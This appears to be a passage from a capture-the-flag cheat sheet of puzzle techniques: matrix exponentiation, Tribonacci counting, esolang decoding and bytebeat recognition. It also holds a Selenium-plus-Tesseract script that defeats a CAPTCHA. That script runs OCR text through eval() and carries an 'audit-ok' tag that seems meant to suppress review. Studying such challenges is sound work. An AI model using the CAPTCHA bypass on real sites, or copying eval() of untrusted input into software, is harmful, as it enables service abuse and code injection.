    return ((a[0]*b[0] + a[1]*b[2]) % MOD, (a[0]*b[1] + a[1]*b[3]) % MOD,
            (a[2]*b[0] + a[3]*b[2]) % MOD, (a[2]*b[1] + a[3]*b[3]) % MOD)
def matpow(M, n):
    R = (1,0,0,1)
    while n:
        if n & 1: R = matmult(R, M)
        M = matmult(M, M); n >>= 1
    return R
```

**Key insight:** Any linear recurrence over a ring is reducible to matrix exponentiation. Use it whenever the challenge exposes a giant `N` for a classical-looking sequence — Fibonacci, Tribonacci, Lucas, linear Pisano, RNG counters.

**References:** Pwn2Win CTF 2018 — Too Slow, writeup 12501

---

## Tribonacci Recurrence for Frog Jump Counting (FireShell 2019)

**Pattern:** A proof-of-work handshake asks how many ways a frog can reach step `N` if it can jump 1, 2, or 3 steps. That is `f(N) = f(N-1) + f(N-2) + f(N-3)` — the Tribonacci sequence. Precompute modulo the server's modulus; for large `N`, combine with matrix exponentiation above.

```python
def tribonacci(N, MOD=13371337):
    a, b, c = 0, 0, 1
    for _ in range(N):
        a, b, c = b, c, (a + b + c) % MOD
    return a  # 0-indexed: after N steps a == f(N)
```

**Key insight:** "Number of ways to climb N stairs with step sizes {1..k}" is always a linear recurrence. Memoize up to the server's max `N`, cache across requests, and keep the tribonacci identity in mind when the challenge text mentions "frog".

**References:** FireShell CTF 2019 — Frogs, writeup 12961

---

## Selenium + Tesseract for Dynamic Font CAPTCHA (Square CTF 2018)

**Pattern:** A CAPTCHA generates math expressions with a random glyph font and rerenders every 5 seconds. Full-window screenshots via Selenium feed Tesseract OCR; clean up Tesseract's common confusions (`x`→`*`, `{`→`(`) before `eval()`.

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from PIL import Image
import pytesseract, io
d = webdriver.Chrome()
d.get(URL); d.execute_script("document.body.style.zoom='450%'")
img = Image.open(io.BytesIO(d.get_screenshot_as_png()))
expr = pytesseract.image_to_string(img).replace('x','*').replace('{','(').replace('}',')')
d.execute_script(f"document.getElementsByName('answer')[0].value={eval(expr)}")  # <!-- audit-ok -->
d.find_element(By.TAG_NAME, 'form').submit()
```

**Key insight:** Dynamic CAPTCHAs are often too short-lived for manual solves but trivial for a 1-second Selenium + Tesseract loop. When OCR alone fails, pair it with a cmap reference library (see osint/web-and-dns.md).

**References:** Square CTF 2018 — C8, writeups 12160, 12178

---

## Brainfuck Decodes Piet Image URL — Multi-Layer Polyglot (RITSEC 2018)

**Pattern:** Recognise the three most common esolangs stacked together: Brainfuck source outputs a YouTube URL, the video's thumbnail border is a Piet program whose execution prints the flag. Use `bf` → `yt-dlp` → strip border pixels → `npiet` pipeline.

```bash
bf puzzle.bf                          # prints youtube.com/watch?v=XXXX
yt-dlp -x --write-thumbnail "$URL"    # grabs JPG thumbnail
python crop_border.py thumb.jpg > piet.png
npiet piet.png                        # prints the flag
```

**Key insight:** Multi-layer esolangs are recognisable by eye: Brainfuck is `+-<>.,[]`, Piet is colored block grids, Whitespace is invisible. If a challenge description mentions multiple "weird" formats, pipeline the decoders in order.

**References:** RITSEC CTF 2018 — writeup 12224

---

## Bytebeat Synth Code Recognition for Hidden Audio (RITSEC 2018)

**Pattern:** A short C-like one-liner is bytebeat — a generative music format where `t` is a monotonic sample counter. Paste into an online interpreter (http://wry.me/bytebeat/) to hear it; the resulting tune is a recognizable song whose title is the flag.

```c
/* Bytebeat example: output byte = low 8 bits of this expression */
(t * ((t >> 12 | t >> 8) & 63 & t >> 4))
```

**Key insight:** Recognise bytebeat by (a) a `t` variable, (b) bitshifts mixed with modulo, (c) output of size 8-bit unsigned integer. `%`, `|`, `&`, `^`, `>>`, `<<` on `t` are the bytebeat signature. No decoding needed — just play it.

**References:** RITSEC CTF 2018 — writeups 12261, 12268

---
